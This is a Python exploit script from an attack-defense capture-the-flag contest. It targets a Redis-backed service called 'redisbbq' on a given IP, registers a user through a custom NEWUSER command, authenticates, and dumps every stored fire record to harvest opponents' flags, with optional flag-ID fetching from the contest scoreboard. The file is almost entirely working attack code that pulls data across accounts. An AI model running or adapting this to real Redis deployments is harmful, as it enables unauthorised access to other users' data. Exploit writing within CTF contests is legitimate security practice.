#!/usr/bin/env python3

import redis
import json
import random
import requests
import string
import sys
from pwn import *

# CHANGE THESE
service_name = 'redisbbq'
service_port = 16379

# UTILITY FUNCTIONS
randstr = lambda N: ''.join(random.choices(string.ascii_uppercase + string.digits, k=N))
randmail = lambda: f"{randstr(8)}@{randstr(8)}.com"

ip = sys.argv[1]
url = f'http://{ip}:{service_port}'

def expl(flag_id=None):
    # Write your exploit here, and print stuff containing the flags
    # flush=True is MANDATORY
    # print('This is the very real output SAAR{BD64SS45S__DV5W8C1N4NB6MJ9K2N3QN}', flush=True)

    user = randstr(16)
    password = randstr(16)

    r = redis.Redis(host=ip, port=16379, decode_responses=True)
    r.execute_command(f'NEWUSER {user} {password}'.encode())
    r.auth(password, user)
    
    for country in r.lrange('newest:countries', 0, -1):
        for fire in r.lrange(f'country:{country}:fires', 0, -1):
            print(r.dump(f'fire:{fire}'), flush=True)


def get_flag_ids():
    r = requests.get('https://scoreboard.ctf.saarland/attack.json')
    if r.status_code != 200:
        print(r.text)
        raise RuntimeError("Failed to fetch flag IDs")
    return json.loads(r.text)

## UNCOMMENT ONE OF THE FOLLOWING

## OPTION 1 - EXPLOIT WITH FLAG IDS
#for tick in get_flag_ids()['flag_ids'][service_name][ip]:
#    for flag_id in tick:
#        expl(flag_id)

## OPTION 2 - EXPLOIT WITHOUT FLAG IDS
expl()
